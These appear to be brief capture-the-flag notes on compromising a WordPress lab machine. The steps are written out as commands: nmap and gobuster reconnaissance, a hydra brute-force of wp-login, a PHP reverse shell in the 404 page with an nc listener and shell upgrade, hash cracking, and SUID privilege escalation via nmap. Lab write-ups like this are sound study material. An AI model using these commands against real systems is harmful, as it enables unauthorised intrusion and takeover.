### RECON 
###### Scanning 
 * `nmap -A X.X.X.X`
	 * 22: ssh
	 * 80: Apache
	 * 443: Apache
 
###### Locating directories
 * `gobuster dir -u X.X.X.X:3333 -w rockuou.txt`
	 * robots.txt → fsocity.dic, key-1-of-3.txt
	 * /wp-login
 
###### Go through the site
* /wp-login ~ exploit
	* find out the right username:
		* Elliot
		* Note: Wordpres login is case-INsensitive

### COMPROMISE
* ```hydra -l elliot -P fsocity.dic X.X.X.X http-post-form "/wp-login:log=^USER^&pwd=^PASS^wp-submit=Log+In:F=The password you entered for username elliot is incorrect"```
	* Elliot: ER28-0652
* modify 404 error page in order to embedd PHP reverse shell
* `nc -lvnp 4444`
* get proper shell: `python -c 'import pty;pty.spawn("/bin/bash")'`
* find interesting files
	* password hash: MD5 ~ crack → key-2-of-3.txt

### PRIVILEGE ESCALATION
* `find / -perm -u=s 2>/dev/null`
	* nmap, vim, find, bash, more, less, nano, cp
	* `nmap --interactive`
	* in /root → key-3-of-3.txt